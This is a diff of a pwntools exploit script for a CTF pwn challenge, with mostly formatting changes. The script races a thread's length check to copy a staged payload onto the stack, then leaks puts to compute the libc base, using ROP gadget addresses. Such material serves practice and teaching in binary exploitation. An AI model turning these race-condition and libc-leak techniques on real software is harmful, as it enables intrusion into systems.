@@ -6,7 +6,6 @@ context.log_level = "warning"
 
 io = remote("nc1.ctfplus.cn", 19964)
 elf = ELF("./pwn")
-rop = ROP(elf)
 libc = ELF("./libc.so.6")
 
 pop_rdi = 0x4012a3
@@ -45,17 +44,17 @@ io.send(flat( # written to .bss
     # .text:000000000040133A                 jmp     short loc_40134B
 ))
 
-io.sendlineafter(b"Choice: ",b"2")
-io.sendlineafter(b"Length: ",b'1')
+io.sendlineafter(b"Choice: ", b"2")
+io.sendlineafter(b"Length: ", b'1')
 
-io.sendlineafter(b"Choice: ",b"3") # Choice 3 here, 'async_puts' writting .bss playload 1 to stack
+io.sendlineafter(b"Choice: ", b"3") # Choice 3 here, 'async_puts' writting .bss playload 1 to stack
 
 io.sendline(b"2")
 io.recvuntil(b"[Thread] Length check passed! Preparing to copy...") # can switch with previous line
 io.sendline(b"512")
 
 io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
-libc_base=u64(io.recv(6)+b"\x00\x00") - libc.sym.puts
+libc_base=u64(io.recv(6) + b"\x00\x00") - libc.sym.puts
 
 io.sendline(b"1")
 io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
